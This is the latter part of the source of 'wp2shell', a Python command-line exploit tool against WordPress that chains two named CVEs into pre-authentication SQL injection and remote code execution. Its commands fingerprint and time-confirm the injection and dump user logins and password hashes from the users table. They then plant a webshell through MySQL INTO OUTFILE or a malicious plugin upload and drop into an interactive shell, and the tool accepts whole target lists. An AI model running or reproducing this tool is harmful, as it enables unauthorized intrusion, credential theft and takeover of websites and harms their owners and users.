        sys.stdout.flush()


def _make_client(args: argparse.Namespace) -> BatchClient:
    return BatchClient(
        args.url, timeout=args.timeout, rest_route=args.rest_route,
        proxy=args.proxy,
    )


def cmd_check(args: argparse.Namespace) -> int:
    client = BatchClient(
        args.url, timeout=max(args.timeout, args.sleep + 10),
        rest_route=args.rest_route, proxy=args.proxy,
    )

    info("detecting WordPress version...")
    ver = detect_version(client, C(), v=args.verbose)
    if ver:
        label = ".".join(map(str, ver))
        if ver in PATCHED:
            good(f"Version: {label} (patched)")
        elif ver in FULL_CHAIN_EXPLOITABLE:
            sev = FULL_CHAIN_EXPLOITABLE[ver]
            warn(f"Version: {label} — VULNERABLE ({sev})")
        elif ver in SQLI_ONLY_UNABLE_TO_REACH:
            warn(f"Version: {label} — SQLi exists (CVE-2026-60137) but batch confusion not present on 6.8.x")
            info(SQLI_ONLY_NOTE[:120] + "...")
        else:
            info(f"Version: {label}")
    else:
        warn("version not detected from public sources")

    # Pre-flight: verify batch endpoint is alive
    info("probing batch endpoint...")
    if not client.ping():
        bad("batch endpoint unreachable — REST API disabled, blocked, or not WordPress")
        return 1

    info("sending marker probe (non-destructive)...")
    result = marker_probe(client)
    if result.desync_detected:
        good(f"route-confusion desync DETECTED (codes: {', '.join(result.codes_found)})")
    elif not result.reachable and ver and ver in SQLI_ONLY_UNABLE_TO_REACH:
        # 6.8.x detected via version: marker probe crashes (block-renderer absent).
        warn("marker probe not applicable on 6.8.x — no route confusion bug present")
        info("SQLi (CVE-2026-60137) exists in WP_Query but unreachable via batch confusion")
        if args.confirm_sqli:
            info("testing direct REST API path for author__not_in SQLi...")
            direct = probe_685_direct(
                client, sleep=args.sleep, c=C(), v=args.verbose)
            if direct is True:
                good("SQLi reachable via direct REST API on 6.8.x!")
                return 0
            elif direct is False:
                info("direct REST API path blocked (validation rejects string)")
                info("requires facilitated path: plugin/theme passing raw author__not_in to WP_Query")
            else:
                info("could not probe direct REST API path")
        else:
            info("use --confirm-sqli to test direct REST API path for 6.8.x")
        return 2
    elif (not result.desync_detected
          and "parse_path_failed" not in (result.codes_found or ())
          and "internal_server_error" in (result.codes_found or ())):
        # 6.8.x signature: marker probe returns 500 with only internal_server_error.
        # The /wp/v2/block-renderer/core/archives route does not exist on 6.8.x.
        warn("marker probe returned internal_server_error without parse_path_failed")
        info("likely WordPress 6.8.x — no route confusion bug present")
        if args.confirm_sqli:
            info("testing direct REST API path for author__not_in SQLi...")
            direct = probe_685_direct(
                client, sleep=args.sleep, c=C(), v=args.verbose)
            if direct is True:
                good("SQLi reachable via direct REST API on 6.8.x!")
                return 0
            elif direct is False:
                info("direct REST API path blocked (validation rejects string)")
                info("requires facilitated path: plugin/theme passing raw author__not_in to WP_Query")
            else:
                info("could not probe direct REST path")
        else:
            info("use --confirm-sqli to test direct REST API path")
        return 2
    elif not result.reachable:
        bad("batch endpoint returned unexpected response")
        if result.codes_found:
            info(f"codes found: {', '.join(result.codes_found)}")
        # Version unknown — could be 6.8.x with crashing marker probe.
        if args.confirm_sqli:
            info("version unknown; testing direct REST API path for 6.8.x SQLi...")
            direct = probe_685_direct(
                client, sleep=args.sleep, c=C(), v=args.verbose)
            if direct is True:
                good("SQLi reachable via direct REST API!")
                return 0
            elif direct is False:
                info("direct REST API path blocked")
        return 1
    else:
        bad(f"desync pattern not detected (codes: {', '.join(result.codes_found)})")
        if not args.confirm_sqli:
            return 2

    if not args.confirm_sqli:
        info("use --confirm-sqli for active SQL timing verification")
        return 0

    info(f"SQL timing confirmation (sleep={args.sleep}s, samples={args.samples})...")
    timing = timing_confirm(client, sleep=args.sleep, samples=args.samples)
    if args.samples > 1:
        for i, (b, d) in enumerate(timing.samples):
            info(f"  sample {i+1}: baseline={b:.2f}s, delayed={d:.2f}s")
        info(f"median delta {timing.delta:.2f}s, threshold {timing.threshold:.2f}s")
    if timing.confirmed:
        good(f"SQLi CONFIRMED — baseline {timing.baseline:.2f}s, "
             f"injected {timing.delayed:.2f}s")
    else:
        bad(f"SQLi not timing-confirmed — baseline {timing.baseline:.2f}s, "
            f"injected {timing.delayed:.2f}s")
    return 0


def cmd_extract(args: argparse.Namespace) -> int:
    client = _make_client(args)
    mode = "fast" if args.fast else "blind"
    extractor = FastExtractor(client) if args.fast else BlindExtractor(client)

    if args.query:
        info(f"extracting ({mode}): {args.query}")
        val = extractor.read_string(args.query, max_length=args.max_length,
                                     on_progress=_progress)
        _clear_progress()
        good(f"Result: {val}")
    elif args.preset == "fingerprint":
        for label, expr in FINGERPRINT:
            good(f"{label}: {extractor.read_string(expr, max_length=args.max_length)}")
    elif args.preset == "users":
        table = f"{args.prefix}users"
        total = extractor.read_int(f"SELECT COUNT(*) FROM {table}")
        info(f"{total} user(s) in {table}")
        for offset in range(total):
            row = extractor.read_string(
                f"SELECT CONCAT_WS(0x7c, ID, user_login, user_pass) "
                f"FROM {table} ORDER BY ID LIMIT {offset},1",
                max_length=args.max_length, on_progress=_progress)
            _clear_progress()
            good(row)
    info(f"{extractor.requests} request(s) sent")
    return 0


def cmd_rce(args: argparse.Namespace) -> int:
    client = _make_client(args)

    if args.outfile:
        info("INTO OUTFILE RCE (requires MySQL FILE privilege)...")
        result = rce_outfile(client, outfile_dir=args.outfile_dir,
                             web_dir=args.web_dir)
        if not result:
            bad("INTO OUTFILE failed — no FILE priv or secure_file_priv set")
            return 1
        web_path, token, fname, reachable = result
        good(f"Webshell: {args.url.rstrip('/')}{web_path}")
        if not reachable:
            warn("Webshell NOT reachable — likely DB + web are separate containers")
            info("File written to DB server filesystem, not the web root. "
                 "Try --outfile-dir pointing to a web-accessible path on the DB host, "
                 "or use --plugin mode with valid credentials.")
            return 1
        if args.cmd:
            info(f"Running: {args.cmd}")
            out = rce_run(client, web_path, token, args.cmd)
            if out:
                print(out)
        if args.interactive:
            _repl_outfile(client, web_path, token)

    elif args.plugin:
        if not args.user or not args.password:
            bad("--user and --password required for plugin mode")
            return 2
        warn("Uploading plugin webshell (post-auth, needs admin credentials)")
        session = AdminShell(args.url, timeout=args.timeout, proxy=args.proxy)
        info(f"Authenticating as {args.user!r}...")
        if not session.login(args.user, args.password):
            bad("Login failed")
            return 1
        good("Authenticated")
        info("Deploying webshell plugin...")
        path = session.deploy()
        good(f"Webshell: {args.url.rstrip('/')}{path}")
        try:
            if args.cmd:
                out = session.run(path, args.cmd)
                if out:
                    print(out)
            if args.interactive:
                _repl_plugin(session, path)
        finally:
            if args.cleanup:
                info("Cleaning up...")
                if session.cleanup(path):
                    good("Webshell removed")
                else:
                    bad("Cleanup failed — remove manually")

    else:
        bad("specify --outfile or --plugin")
        return 2
    return 0


def _repl_outfile(client: BatchClient, path: str, token: str) -> None:
    info("Interactive shell — type 'exit' or Ctrl-D to quit")
    while True:
        try:
            line = input("\033[36mshell>\033[0m " if _TTY else "shell> ")
        except (EOFError, KeyboardInterrupt):
            print()
            return
        cmd = line.strip()
        if not cmd:
            continue
        if cmd in ("exit", "quit"):
            return
        out = rce_run(client, path, token, cmd)
        if out is not None:
            print(out)


def _repl_plugin(session: AdminShell, path: str) -> None:
    info("Interactive shell — type 'exit' or Ctrl-D to quit")
    cwd = "/"
    while True:
        try:
            prompt = f"\033[36m{cwd} $\033[0m " if _TTY else f"{cwd} $ "
            line = input(prompt)
        except (EOFError, KeyboardInterrupt):
            print()
            return
        cmd = line.strip()
        if not cmd:
            continue
        if cmd in ("exit", "quit"):
            return
        out = session.run(
            path,
            f"cd {shlex.quote(cwd)} 2>/dev/null; {cmd}; "
            f"printf '__WPCWD__%s' \"$(pwd)\""
        )
        if out is None:
            bad("no response")
            continue
        if "__WPCWD__" in out:
            body, _, tail = out.rpartition("__WPCWD__")
            cwd = tail.strip() or cwd
            out = body
        out = out.rstrip("\n")
        if out:
            print(out)


def _paint(code: str, text: str) -> str:
    return f"\033[{code}m{text}\033[0m" if _TTY else text


def _short(text: str, *, limit: int = 96) -> str:
    if len(text) <= limit:
        return text
    return text[: limit - 3] + "..."


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="wp2shell",
        description="CVE-2026-63030 + CVE-2026-60137 — Pre-auth SQLi → RCE",
    )
    p.add_argument("--version", action="version", version=f"wp2shell {VERSION}")
    sub = p.add_subparsers(dest="command")

    # probe — admin endpoint mapping + secret extraction
    prb = sub.add_parser("probe", help="map admin endpoints via route confusion")
    prb.add_argument("url", nargs="?", help="target base URL")
    prb.add_argument("--targets", "-t", help="file with target URLs, one per line")
    prb.add_argument("--rest-route", action="store_true")
    prb.add_argument("--timeout", type=float, default=30.0)
    prb.add_argument("--proxy", help="HTTP proxy")
    prb.add_argument("--confirm-sqli", action="store_true",
                     help="also extract secrets via blind SQLi")
    prb.set_defaults(func=cmd_probe)

    # check
    chk = sub.add_parser("check", help="non-destructive vulnerability detection")
    chk.add_argument("url", nargs="?", help="target base URL")
    chk.add_argument("--targets", "-t", help="file with target URLs, one per line")
    chk.add_argument("--rest-route", action="store_true",
                     help="use ?rest_route=/batch/v1")
    chk.add_argument("--timeout", type=float, default=30.0)
    chk.add_argument("--proxy", help="HTTP proxy")
    chk.add_argument("--sleep", type=float, default=3.0,
                     help="SQL timing delay (default: 3)")
    chk.add_argument("--samples", type=int, default=3,
                     help="timing sample pairs (default: 3)")
    chk.add_argument("--confirm-sqli", action="store_true",
                     help="send active SQL timing payload")
    chk.add_argument("-v", "--verbose", action="store_true")
    chk.set_defaults(func=cmd_check)

    # extract
    ext = sub.add_parser("extract", help="read database via blind SQLi")
    ext.add_argument("url", nargs="?", help="target base URL")
    ext.add_argument("--targets", "-t", help="file with target URLs, one per line")
    ext.add_argument("--rest-route", action="store_true")
    ext.add_argument("--timeout", type=float, default=30.0)
    ext.add_argument("--proxy", help="HTTP proxy")
    ext.add_argument("--fast", action="store_true",
                     help="use fast X-WP-Total extraction (default: blind)")
    group = ext.add_mutually_exclusive_group()
    group.add_argument("--preset", choices=("fingerprint", "users"),
                       default="fingerprint")
    group.add_argument("--query", help="scalar SQL expression")
    ext.add_argument("--prefix", default="wp_", help="table prefix (default: wp_)")
    ext.add_argument("--max-length", type=int, default=128)
    ext.set_defaults(func=cmd_extract)

    # rce
    rce = sub.add_parser("rce", help="remote code execution")
    rce.add_argument("url", nargs="?", help="target base URL")
    rce.add_argument("--targets", "-t", help="file with target URLs, one per line")
    rce.add_argument("--rest-route", action="store_true")
    rce.add_argument("--timeout", type=float, default=30.0)
    rce.add_argument("--proxy", help="HTTP proxy")
    rce.add_argument("--cmd", help="command to execute")
    rce.add_argument("-i", "--interactive", action="store_true",
                     help="interactive shell")
    mode = rce.add_mutually_exclusive_group(required=True)
    mode.add_argument("--outfile", action="store_true",
                      help="INTO OUTFILE RCE (needs FILE privilege)")
    mode.add_argument("--plugin", action="store_true",
                      help="plugin-upload RCE (needs admin creds)")
    rce.add_argument("--outfile-dir", default="/var/lib/mysql-files",
                     help="MySQL outfile dir (default: /var/lib/mysql-files)")
    rce.add_argument("--web-dir", default="/rce",
                     help="web-accessible counterpart (default: /rce)")
    rce.add_argument("--user", help="admin username (for --plugin)")
    rce.add_argument("--password", help="admin password (for --plugin)")
    rce.add_argument("--cleanup", action="store_true",
                     help="remove webshell when done (plugin mode)")
    rce.set_defaults(func=cmd_rce)

    return p


def _read_targets(path: str) -> List[str]:
    """Read target URLs from file, one per line, skip blanks and comments."""
    targets = []
    with open(path) as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                targets.append(line)
    return targets


def _run_with_targets(args: argparse.Namespace) -> int:
    """Run command against each target from --targets file or single URL."""
    if args.targets:
        targets = _read_targets(args.targets)
        if not targets:
            bad(f"no targets found in {args.targets}")
            return 1
        info(f"loaded {len(targets)} target(s) from {args.targets}")
        results = []
        for i, url in enumerate(targets, 1):
            info(f"[{i}/{len(targets)}] {url}")
            args.url = url
            try:
                results.append(args.func(args))
            except (KeyboardInterrupt, SystemExit):
                raise
            except Exception as e:
                warn(f"  failed: {e}")
                results.append(1)
        failures = sum(1 for r in results if r != 0)
        if failures:
            warn(f"{failures}/{len(results)} target(s) returned non-zero")
        return 0 if failures == 0 else 1
    else:
        if not args.url:
            bad("specify URL or --targets FILE")
            return 1
        return args.func(args)


def main(argv: Optional[list] = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    if not hasattr(args, "func"):
        parser.print_help()
        return 1
    try:
        return _run_with_targets(args)
    except KeyboardInterrupt:
        sys.stderr.write("\nInterrupted\n")
        return 130
    except Exception as e:
        bad(str(e))
        return 1


if __name__ == "__main__":
    sys.exit(main())
